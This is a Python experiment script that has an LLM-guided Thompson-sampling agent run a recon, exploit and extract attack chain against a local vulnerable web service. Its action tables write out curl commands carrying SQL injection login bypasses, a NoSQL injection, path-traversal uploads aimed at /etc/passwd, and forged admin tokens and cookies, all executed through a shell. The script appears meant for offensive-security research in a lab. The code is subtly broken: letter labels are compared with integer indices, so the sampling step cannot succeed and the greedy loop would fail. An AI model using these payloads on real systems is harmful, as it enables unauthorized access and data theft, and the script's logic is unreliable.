#!/usr/bin/env python3
"""Real attack chain experiment with vulnerable web service.

Deploys a Python vulnerable service, then runs LLM-TS vs Uniform-TS vs Greedy
on a 3-step attack chain (recon, exploit, extract).
Each step has K=6 actions, ground truth optimal is known.
Noise is real (network latency, service state, parsing errors).
"""
import subprocess, time, json, os, sys, re
import numpy as np
import requests

# Config
SERVICE_HOST = "127.0.0.1"
SERVICE_PORT = 8888
SERVICE_URL = f"http://{SERVICE_HOST}:{SERVICE_PORT}"
GATEWAY = 'http://172.16.4.201:8000'
N_CHAINS = 20        # trials per method
N_ACTIONS = 6
T_BUDGET = 20
R_RETRIES = 3
LAMBDA = 0.05
LABELS = [chr(65+i) for i in range(N_ACTIONS)]


# ============================================================
# Step definitions
# ============================================================

# Step 1: Recon - discover what the service offers
RECON_DESC = (
    "Target web service found on internal network. Initial reconnaissance needed. "
    "Goal: discover available API endpoints and identify attack surface."
)
RECON_ACTIONS = {
    'A': ('GET /', 'curl -s http://%s/'),
    'B': ('GET /api/login', 'curl -s http://%s/api/login'),
    'C': ('POST /api/login with test creds', 'curl -s -X POST http://%s/api/login -H "Content-Type: application/json" -d \'{"username":"test","password":"test"}\''),
    'D': ('GET /robots.txt', 'curl -s http://%s/robots.txt'),
    'E': ('OPTIONS /', 'curl -s -X OPTIONS http://%s/'),
    'F': ('GET /api/flag', 'curl -s http://%s/api/flag'),
}
RECON_OPTIMAL = 'A'  # GET / reveals all endpoints + SQLi hint

# Step 2: Exploit - use SQLi to get admin access
EXPLOIT_DESC = (
    "API login endpoint discovered at /api/login. The service hint mentions "
    "'SQL injection may reveal hidden data'. Goal: gain privileged access."
)
EXPLOIT_ACTIONS = {
    'A': ("SQLi: admin' OR '1'='1", 'curl -s -X POST http://%s/api/login -H "Content-Type: application/json" -d \'{"username":"admin'"'"' OR '"'"'1'"'"'='"'"'1","password":"x"}\''),
    'B': ("Brute force admin:password", 'curl -s -X POST http://%s/api/login -H "Content-Type: application/json" -d \'{"username":"admin","password":"password"}\''),
    'C': ("Try admin:admin", 'curl -s -X POST http://%s/api/login -H "Content-Type: application/json" -d \'{"username":"admin","password":"admin"}\''),
    'D': ("SQLi: UNION-based", 'curl -s -X POST http://%s/api/login -H "Content-Type: application/json" -d \'{"username":"\''"'"' UNION SELECT 1,2,3--","password":"x"}\''),
    'E': ("NoSQL injection attempt", 'curl -s -X POST http://%s/api/login -H "Content-Type: application/json" -d \'{"username":{"$ne":""},"password":{"$ne":""}}\''),
    'F': ("Try common admin:123456", 'curl -s -X POST http://%s/api/login -H "Content-Type: application/json" -d \'{"username":"admin","password":"123456"}\''),
}
EXPLOIT_OPTIMAL = 'A'  # SQLi bypass with OR '1'='1'

# Step 3: Extract - use admin access to get the flag
EXTRACT_DESC = (
    "Admin token obtained from SQL injection. Goal: locate and retrieve the flag."
)
EXTRACT_ACTIONS = {
    'A': ("Get users with token, then upload+flag",
          'TOKEN="admin-token-secret"; curl -s http://%s/api/users -H "Authorization: Bearer $TOKEN"; curl -s -X POST http://%s/api/upload -H "X-Filename: ../../secret_panel" -d "x"; curl -s http://%s/api/admin/secret_panel -H "Cookie: admin_session=1"'),
    'B': ("Try /api/flag directly", 'curl -s http://%s/api/flag'),
    'C': ("Try /api/admin with token", 'curl -s http://%s/api/admin -H "Authorization: Bearer admin-token-secret"'),
    'D': ("Upload path traversal", 'curl -s -X POST http://%s/api/upload -H "X-Filename: ../../../etc/passwd" -d "test"'),
    'E': ("Try /api/flag with token", 'curl -s http://%s/api/flag -H "Authorization: Bearer admin-token-secret"'),
    'F': ("Enumerate with wget spider", 'wget -r -l 2 --spider http://%s/ 2>&1 | head -20'),
}
EXTRACT_OPTIMAL = 'A'  # Complete chain: users → upload exploit → admin key → flag


def run_action(cmd_template):
    """Execute an HTTP action, return (success, response_text)."""
    host = f"{SERVICE_HOST}:{SERVICE_PORT}"
    cmd = cmd_template % host
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return r.returncode == 0 or r.returncode == 1, r.stdout + r.stderr
    except:
        return False, ""


def check_step_success(step_name, response):
    """Check if the step succeeded based on response content."""
    if step_name == 'recon':
        return 'SQL injection' in response.lower() or ('login' in response.lower() and 'flag' in response.lower())
    elif step_name == 'exploit':
        return 'admin-token-secret' in response or ('token' in response.lower() and 'admin' in response.lower())
    elif step_name == 'extract':
        return 'FLAG{' in response or 'flag{' in response.lower()
    return False


def get_llm_prior(desc, actions_dict):
    """Get LLM prior for a set of named actions."""
    action_names = [v[0] for v in actions_dict.values()]
    resp = requests.post(f'{GATEWAY}/v1/prior', json={
        'state_description': desc,
        'available_actions': action_names
    }, timeout=30)
    raw = resp.json()['probabilities']
    prior = {l: max(raw.get(l, 0.01), 0.001) for l in LABELS}
    total = sum(prior.values())
    return {k: v/total for k, v in prior.items()}


def ts_step(prior_dict, optimal_label, step_name, actions_dict, T, R):
    """Thompson Sampling step."""
    alpha = {l: 1.0 for l in LABELS}
    beta = {l: 1.0 for l in LABELS}
    samples_used = 0

    for retry in range(R):
        for t in range(T):
            samples_used += 1
            thompson = {}
            for l in LABELS:
                thompson[l] = np.random.beta(alpha[l], beta[l]) + LAMBDA * prior_dict.get(l, 1/N_ACTIONS)
            chosen = max(thompson, key=thompson.get)

            cmd = actions_dict[chosen][1]
            ok, resp = run_action(cmd)
            success = check_step_success(step_name, resp)

            if success:
                alpha[chosen] += 1.0
            else:
                beta[chosen] += 1.0

            time.sleep(0.15)

        best = max(LABELS, key=lambda l: alpha[l]/(alpha[l]+beta[l]))
        if best == optimal_label:
            return True, samples_used
        beta[best] += 2.0

    return False, samples_used


def greedy_step(prior_dict, optimal_label, step_name, actions_dict):
    """Greedy step (no exploration)."""
    best = max(LABELS, key=lambda l: prior_dict.get(l, 0))
    cmd = actions_dict[best][1]
    ok, resp = run_action(cmd)
    success = check_step_success(step_name, resp)
    return success and best == optimal_label, 1


def run_chain(step_names, step_actions, step_optimals, step_descs,
              prior_dicts, T, R):
    """Run a complete attack chain."""
    success = True
    total_samples = 0
    for name, actions, optimal, desc, prior in zip(
        step_names, step_actions, step_optimals, step_descs, prior_dicts):
        ok, samples = ts_step(prior, optimal, name, actions, T, R)
        if not ok:
            success = False
            break
        total_samples += samples
        time.sleep(0.3)
    return success, total_samples


def main():
    sep = '=' * 65
    print(sep)
    print('REAL VULNERABLE SERVICE EXPERIMENT')
    print(f'{N_CHAINS} chains/method, T={T_BUDGET}, R={R_RETRIES}')
    print(sep)

    # Verify service is running
    try:
        r = requests.get(f'http://{SERVICE_HOST}:{SERVICE_PORT}/', timeout=3)
        print(f'Service OK: {r.json()}')
    except Exception as e:
        print(f'ERROR: Service not reachable at {SERVICE_URL} - {e}')
        print('Start with: python3 vuln_service.py 8888 &')
        sys.exit(1)

    # Cache LLM priors
    step_configs = [
        ('recon', RECON_ACTIONS, RECON_OPTIMAL, RECON_DESC),
        ('exploit', EXPLOIT_ACTIONS, EXPLOIT_OPTIMAL, EXPLOIT_DESC),
        ('extract', EXTRACT_ACTIONS, EXTRACT_OPTIMAL, EXTRACT_DESC),
    ]

    step_names = [s[0] for s in step_configs]
    step_actions = [s[1] for s in step_configs]
    step_optimals = [LABELS.index(s[2]) for s in step_configs]
    step_descs = [s[3] for s in step_configs]

    print('\nLLM Priors:')
    llm_priors = []
    for name, actions, optimal, desc in step_configs:
        p = get_llm_prior(desc, actions)
        llm_priors.append(p)
        p_opt = p[optimal]
        rank = sorted(p, key=p.get, reverse=True).index(optimal) + 1
        best_action = actions[optimal][0]
        print(f'  {name}: P(opt)={p_opt:.3f} rank={rank}/{N_ACTIONS} ({best_action})')
        time.sleep(0.2)

    uni_prior = {l: 1.0/N_ACTIONS for l in LABELS}
    uni_priors = [uni_prior] * 3

    # Run experiments
    for method_name, priors in [('LLM-TS', llm_priors), ('Uniform-TS', uni_priors)]:
        print(f'\n{sep}')
        print(f'{method_name}')
        print(sep)

        chain_successes = 0
        step_results = {name: 0 for name in step_names}

        for trial in range(N_CHAINS):
            ok, samples = run_chain(step_names, step_actions, step_optimals,
                                    step_descs, priors, T_BUDGET, R_RETRIES)
            if ok:
                chain_successes += 1
            time.sleep(0.2)

            if (trial + 1) % 5 == 0:
                print(f'  Trial {trial+1}/{N_CHAINS}: running success={chain_successes/(trial+1):.1%}')

        rate = chain_successes / N_CHAINS
        se = np.sqrt(rate * (1-rate) / N_CHAINS)
        print(f'  Chain success: {rate:.1%} ± {se:.1%} ({chain_successes}/{N_CHAINS})')

    # Also test Greedy quickly
    print(f'\n{sep}')
    print('LLM-Greedy (no exploration)')
    print(sep)
    greedy_success = 0
    for trial in range(N_CHAINS):
        ok = True
        for name, actions, optimal, desc, prior in zip(
            step_names, step_actions, step_optimals, step_descs, llm_priors):
            step_ok, _ = greedy_step(prior, LABELS.index(optimal), name, actions)
            if not step_ok:
                ok = False
                break
        if ok:
            greedy_success += 1
        time.sleep(0.15)
    rate = greedy_success / N_CHAINS
    se = np.sqrt(rate * (1-rate) / N_CHAINS)
    print(f'  Chain success: {rate:.1%} ± {se:.1%} ({greedy_success}/{N_CHAINS})')

    # Save results
    results = {
        'n_chains': N_CHAINS,
        'T': T_BUDGET, 'R': R_RETRIES,
        'llm_priors': {name: {k: float(v) for k, v in p.items()}
                       for name, p in zip(step_names, llm_priors)},
    }
    os.makedirs('results', exist_ok=True)
    json.dump(results, open('results/real_vuln_service.json', 'w'), indent=2)
    print(f'\nSaved.')


if __name__ == '__main__':
    main()
